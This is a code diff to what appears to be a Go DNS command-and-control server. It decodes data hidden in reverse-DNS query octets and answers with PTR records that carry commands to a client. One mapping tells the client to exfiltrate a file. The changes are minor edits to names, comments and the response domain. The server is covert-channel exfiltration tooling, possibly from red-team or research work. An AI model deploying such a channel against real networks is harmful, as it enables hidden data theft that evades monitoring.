@@ -22,7 +22,7 @@ func decodeAddress(octets []string, b *int, m *string, c *bool, lsb *[]byte) str
 
 	// Specify what the client should do on the next connection to this server
 	// This example specifies that the client should exfiltrate (exf) the file test.txt to the server.
-	c2_mappings := map[string]string{"hbt": "cmd.exf.test.txt"}
+	c2_mappings := map[string]string{"hbt": "cmd-exfil-single.test.txt"}
 
 	// If the first octet is equal to "172" or "185", the operation is setting the current baseline. Otherwise, decode the data using the baseline.
 	if octets[0] == "172" || octets[0] == "185" {
@@ -98,7 +98,7 @@ func handleRequest(w dns.ResponseWriter, r *dns.Msg) {
 	if err != nil {
 		panic(err)
 	}
-	word := g.Word() 
+	word := g.Word()
 
 	// Retrieve the octets being sent over.
 	var ipv4 []string = strings.Split(r.Question[0].Name, ".in-addr.arpa.")
@@ -115,13 +115,14 @@ func handleRequest(w dns.ResponseWriter, r *dns.Msg) {
 	// Decode the data encoded into the octets.
 	val := decodeAddress(reassembled_octets, &baseline, &mode, &collecting, &ls_bytes)
 
+	// If we are responding with a command for the client, send the command. Otherwise, send back the randomly generated word.
 	if val != "" {
 		word = val
 	}
 	// Send a PTR response back to the client.
 	m := new(dns.Msg)
 	m.SetReply(r)
-	rr, _ := dns.NewRR(fmt.Sprintf("%s  3600  IN  PTR  %s.com", r.Question[0].Name, word))
+	rr, _ := dns.NewRR(fmt.Sprintf("%s  3600  IN  PTR  %s.net.", r.Question[0].Name, word))
 	m.Answer = append(m.Answer, rr)
 	w.WriteMsg(m)
 }
